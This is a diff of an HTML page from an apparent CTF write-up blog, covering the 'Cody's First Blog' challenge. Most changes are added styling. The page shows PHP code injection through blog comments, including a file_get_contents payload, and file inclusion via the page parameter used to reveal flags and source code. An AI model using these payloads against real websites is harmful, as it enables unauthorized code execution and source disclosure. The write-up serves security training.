@@ -11,9 +11,80 @@
       span.underline{text-decoration: underline;}
       div.column{display: inline-block; vertical-align: top; width: 50%;}
   </style>
+  <style>
+pre > code.sourceCode { white-space: pre; position: relative; }
+pre > code.sourceCode > span { display: inline-block; line-height: 1.25; }
+pre > code.sourceCode > span:empty { height: 1.2em; }
+code.sourceCode > span { color: inherit; text-decoration: inherit; }
+div.sourceCode { margin: 1em 0; }
+pre.sourceCode { margin: 0; }
+@media screen {
+div.sourceCode { overflow: auto; }
+}
+@media print {
+pre > code.sourceCode { white-space: pre-wrap; }
+pre > code.sourceCode > span { text-indent: -5em; padding-left: 5em; }
+}
+pre.numberSource code
+  { counter-reset: source-line 0; }
+pre.numberSource code > span
+  { position: relative; left: -4em; counter-increment: source-line; }
+pre.numberSource code > span > a:first-child::before
+  { content: counter(source-line);
+    position: relative; left: -1em; text-align: right; vertical-align: baseline;
+    border: none; display: inline-block;
+    -webkit-touch-callout: none; -webkit-user-select: none;
+    -khtml-user-select: none; -moz-user-select: none;
+    -ms-user-select: none; user-select: none;
+    padding: 0 4px; width: 4em;
+    background-color: #232629;
+    color: #7a7c7d;
+  }
+pre.numberSource { margin-left: 3em; border-left: 1px solid #7a7c7d;  padding-left: 4px; }
+div.sourceCode
+  { color: #cfcfc2; background-color: #232629; }
+@media screen {
+pre > code.sourceCode > span > a:first-child::before { text-decoration: underline; }
+}
+code span. { color: #cfcfc2; } /* Normal */
+code span.al { color: #95da4c; background-color: #4d1f24; font-weight: bold; } /* Alert */
+code span.an { color: #3f8058; } /* Annotation */
+code span.at { color: #2980b9; } /* Attribute */
+code span.bn { color: #f67400; } /* BaseN */
+code span.bu { color: #7f8c8d; } /* BuiltIn */
+code span.cf { color: #fdbc4b; font-weight: bold; } /* ControlFlow */
+code span.ch { color: #3daee9; } /* Char */
+code span.cn { color: #27aeae; font-weight: bold; } /* Constant */
+code span.co { color: #7a7c7d; } /* Comment */
+code span.cv { color: #7f8c8d; } /* CommentVar */
+code span.do { color: #a43340; } /* Documentation */
+code span.dt { color: #2980b9; } /* DataType */
+code span.dv { color: #f67400; } /* DecVal */
+code span.er { color: #da4453; text-decoration: underline; } /* Error */
+code span.ex { color: #0099ff; font-weight: bold; } /* Extension */
+code span.fl { color: #f67400; } /* Float */
+code span.fu { color: #8e44ad; } /* Function */
+code span.im { color: #27ae60; } /* Import */
+code span.in { color: #c45b00; } /* Information */
+code span.kw { color: #cfcfc2; font-weight: bold; } /* Keyword */
+code span.op { color: #cfcfc2; } /* Operator */
+code span.ot { color: #27ae60; } /* Other */
+code span.pp { color: #27ae60; } /* Preprocessor */
+code span.re { color: #2980b9; background-color: #153042; } /* RegionMarker */
+code span.sc { color: #3daee9; } /* SpecialChar */
+code span.ss { color: #da4453; } /* SpecialString */
+code span.st { color: #f44f4f; } /* String */
+code span.va { color: #27aeae; } /* Variable */
+code span.vs { color: #da4453; } /* VerbatimString */
+code span.wa { color: #da4453; } /* Warning */
+  </style>
   <!--[if lt IE 9]>
     <script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv-printshiv.min.js"></script>
   <![endif]-->
+      <meta charset="UTF-8">
+      <meta name=”robots” content="index, follow">
+      <meta name="description" content="CTF Writeups, hacking techniques, reverse engineering & binary exploit, etc.">
+      <title>Onealmond</title>
       <link rel="stylesheet" type="text/css" href="../../css/global.css"></link>
       <script type="text/javascript" src="../../js/common.js"></script>
 </head>
@@ -24,27 +95,27 @@
 <h1 class="title">Cody's First Blog</h1>
 </header>
 <p>Test path accessiblity</p>
-<pre><code>http://34.74.105.127/9ec2869b99/index.php</code></pre>
+<div class="sourceCode" id="cb1"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb1-1"><a href="#cb1-1"></a>http://34.74.105.127/9ec2869b99/index.php</span></code></pre></div>
 <p>Create comment with body</p>
-<pre><code>  &lt;?php phpinfo() ?&gt;</code></pre>
+<div class="sourceCode" id="cb2"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb2-1"><a href="#cb2-1"></a>  &lt;<span class="ot">?</span>php <span class="fu">phpinfo</span><span class="ot">()</span> <span class="kw">?&gt;</span></span></code></pre></div>
 <p>Submit to get a flag</p>
 <p>By viewing page source found a path to admin login page</p>
-<pre><code>  http://34.74.105.127/9ec2869b99/?page=admin.auth.inc</code></pre>
+<div class="sourceCode" id="cb3"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb3-1"><a href="#cb3-1"></a>  http://34.74.105.127/9ec2869b99/?page=admin.auth.inc</span></code></pre></div>
 <p>Try another value of page</p>
-<pre><code>  http://34.74.105.127/9ec2869b99/?page=xx</code></pre>
+<div class="sourceCode" id="cb4"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb4-1"><a href="#cb4-1"></a>  http://34.74.105.127/9ec2869b99/?page=xx</span></code></pre></div>
 <p>An error message was received</p>
-<pre><code>  Warning: include(xx.php): failed to open stream: No such file or directory</code></pre>
+<div class="sourceCode" id="cb5"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb5-1"><a href="#cb5-1"></a>  Warning: <span class="kw">include</span><span class="ot">(</span>xx.php<span class="ot">)</span>: failed to open stream: No such <span class="fu">file</span> <span class="kw">or</span> <span class="kw">directory</span></span></code></pre></div>
 <p>So the value of page is a filename without suffix</p>
 <p>Keep on trying, seems subpath php.ini is accessible</p>
-<pre><code>  http://34.74.105.127/9ec2869b99/php.ini</code></pre>
+<div class="sourceCode" id="cb6"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb6-1"><a href="#cb6-1"></a>  http://34.74.105.127/9ec2869b99/php.ini</span></code></pre></div>
 <p>Try another possible file name</p>
-<pre><code>  http://34.74.105.127/9ec2869b99/?page=admin.inc</code></pre>
+<div class="sourceCode" id="cb7"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb7-1"><a href="#cb7-1"></a>  http://34.74.105.127/9ec2869b99/?page=admin.inc</span></code></pre></div>
 <p>It leads to a flag at the bottom of the response page</p>
 <p>Comment with content</p>
-<pre><code>  &lt;?php echo file_get_contents(&#39;index.php&#39;);?&gt;</code></pre>
+<div class="sourceCode" id="cb8"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb8-1"><a href="#cb8-1"></a>  &lt;<span class="ot">?</span>php <span class="kw">echo</span> <span class="fu">file_get_contents</span><span class="ot">(</span><span class="st">&#39;index.php&#39;</span><span class="ot">);</span><span class="kw">?&gt;</span></span></code></pre></div>
 <p>Approve this comment in ‘Pending Comments’ page.</p>
 <p>Visit home page via</p>
-<pre><code>  http://34.74.105.127/9ec2869b99/?page=http://localhost/index</code></pre>
+<div class="sourceCode" id="cb9"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb9-1"><a href="#cb9-1"></a>  http://34.74.105.127/9ec2869b99/?page=http://localhost/index</span></code></pre></div>
 <p>Found the 3rd flag in source code of <code>index.php</code></p>
     </div>
     <a id="back-to-top" class="back-to-top" href="#header">TOP</a>
